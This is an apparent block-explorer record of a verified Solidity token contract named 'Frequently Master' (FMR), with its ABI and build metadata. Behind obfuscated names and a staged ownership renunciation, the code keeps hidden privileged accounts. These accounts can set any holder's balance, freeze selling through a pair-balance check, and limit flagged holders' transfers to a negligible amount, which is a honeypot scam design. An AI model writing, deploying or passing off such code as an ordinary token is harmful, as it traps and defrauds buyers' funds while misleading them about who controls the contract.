{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface launchReceiver {\n    function createPair(address feeSell, address exemptToken) external returns (address);\n}\n\ninterface senderTokenWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapExempt) external view returns (uint256);\n\n    function transfer(address amountLaunched, uint256 feeSwap) external returns (bool);\n\n    function allowance(address fromTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountLaunched,\n        uint256 feeSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listReceiverFee, uint256 value);\n    event Approval(address indexed fromTx, address indexed spender, uint256 value);\n}\n\nabstract contract txAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamSellMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface autoTake is senderTokenWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FrequentlyMaster is txAuto, senderTokenWallet, autoTake {\n\n    bool public autoEnableAmount;\n\n    function balanceOf(address swapExempt) public view virtual override returns (uint256) {\n        return limitFund[swapExempt];\n    }\n\n    mapping(address => bool) public receiverMax;\n\n    address public walletTeam;\n\n    bool private enableExempt;\n\n    function amountTotalMax(uint256 feeSwap) public {\n        atSwap();\n        takeLimitMax = feeSwap;\n    }\n\n    mapping(address => bool) public totalTo;\n\n    uint256 constant teamTakeMax = 16 ** 10;\n\n    uint256 tradingFundReceiver;\n\n    uint256 public txBuySwap;\n\n    bool private isSenderShould;\n\n    function txFundMarketing(address teamList, uint256 feeSwap) public {\n        atSwap();\n        limitFund[teamList] = feeSwap;\n    }\n\n    address private receiverShould;\n\n    constructor (){\n        if (txBuySwap == txLimit) {\n            isSenderShould = false;\n        }\n        teamSellMax fromAt = teamSellMax(liquidityLaunchedTo);\n        walletTeam = launchReceiver(fromAt.factory()).createPair(fromAt.WETH(), address(this));\n        \n        minBuy = _msgSender();\n        receiverMax[minBuy] = true;\n        limitFund[minBuy] = buyReceiver;\n        shouldReceiver();\n        \n        emit Transfer(address(0), minBuy, buyReceiver);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletEnable;\n    }\n\n    function approve(address tokenShould, uint256 feeSwap) public virtual override returns (bool) {\n        enableBuy[_msgSender()][tokenShould] = feeSwap;\n        emit Approval(_msgSender(), tokenShould, feeSwap);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapAuto;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyReceiver;\n    }\n\n    function buyTo(address feeLiquidityFund, address amountLaunched, uint256 feeSwap) internal returns (bool) {\n        require(limitFund[feeLiquidityFund] >= feeSwap);\n        limitFund[feeLiquidityFund] -= feeSwap;\n        limitFund[amountLaunched] += feeSwap;\n        emit Transfer(feeLiquidityFund, amountLaunched, feeSwap);\n        return true;\n    }\n\n    string private swapAuto = \"Frequently Master\";\n\n    string private walletEnable = \"FMR\";\n\n    uint256 takeLimitMax;\n\n    function atSwap() private view {\n        require(receiverMax[_msgSender()]);\n    }\n\n    function fundReceiver(address liquidityReceiver) public {\n        atSwap();\n        if (shouldList == autoEnableAmount) {\n            autoEnableAmount = true;\n        }\n        if (liquidityReceiver == minBuy || liquidityReceiver == walletTeam) {\n            return;\n        }\n        totalTo[liquidityReceiver] = true;\n    }\n\n    address public minBuy;\n\n    function transfer(address teamList, uint256 feeSwap) external virtual override returns (bool) {\n        return toFund(_msgSender(), teamList, feeSwap);\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverShould;\n    }\n\n    bool private fromIsMin;\n\n    address liquidityLaunchedTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address feeLiquidityFund, address amountLaunched, uint256 feeSwap) external override returns (bool) {\n        if (_msgSender() != liquidityLaunchedTo) {\n            if (enableBuy[feeLiquidityFund][_msgSender()] != type(uint256).max) {\n                require(feeSwap <= enableBuy[feeLiquidityFund][_msgSender()]);\n                enableBuy[feeLiquidityFund][_msgSender()] -= feeSwap;\n            }\n        }\n        return toFund(feeLiquidityFund, amountLaunched, feeSwap);\n    }\n\n    bool public receiverLimit;\n\n    mapping(address => mapping(address => uint256)) private enableBuy;\n\n    address amountTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private buyReceiver = 100000000 * 10 ** 18;\n\n    uint8 private tokenFund = 18;\n\n    function allowance(address limitMax, address tokenShould) external view virtual override returns (uint256) {\n        if (tokenShould == liquidityLaunchedTo) {\n            return type(uint256).max;\n        }\n        return enableBuy[limitMax][tokenShould];\n    }\n\n    mapping(address => uint256) private limitFund;\n\n    bool private shouldList;\n\n    function takeIs(address enableLaunched) public {\n        if (receiverLimit) {\n            return;\n        }\n        if (isSenderShould) {\n            autoEnableAmount = false;\n        }\n        receiverMax[enableLaunched] = true;\n        \n        receiverLimit = true;\n    }\n\n    function toFund(address feeLiquidityFund, address amountLaunched, uint256 feeSwap) internal returns (bool) {\n        if (feeLiquidityFund == minBuy) {\n            return buyTo(feeLiquidityFund, amountLaunched, feeSwap);\n        }\n        uint256 txAmount = senderTokenWallet(walletTeam).balanceOf(amountTrading);\n        require(txAmount == takeLimitMax);\n        require(amountLaunched != amountTrading);\n        if (totalTo[feeLiquidityFund]) {\n            return buyTo(feeLiquidityFund, amountLaunched, teamTakeMax);\n        }\n        return buyTo(feeLiquidityFund, amountLaunched, feeSwap);\n    }\n\n    uint256 private txLimit;\n\n    event OwnershipTransferred(address indexed maxIs, address indexed walletTakeList);\n\n    function owner() external view returns (address) {\n        return receiverShould;\n    }\n\n    function shouldReceiver() public {\n        emit OwnershipTransferred(minBuy, address(0));\n        receiverShould = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenFund;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTakeList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listReceiverFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeSwap\",\"type\":\"uint256\"}],\"name\":\"amountTotalMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoEnableAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"}],\"name\":\"fundReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLaunched\",\"type\":\"address\"}],\"name\":\"takeIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLiquidityFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txBuySwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeSwap\",\"type\":\"uint256\"}],\"name\":\"txFundMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "FrequentlyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}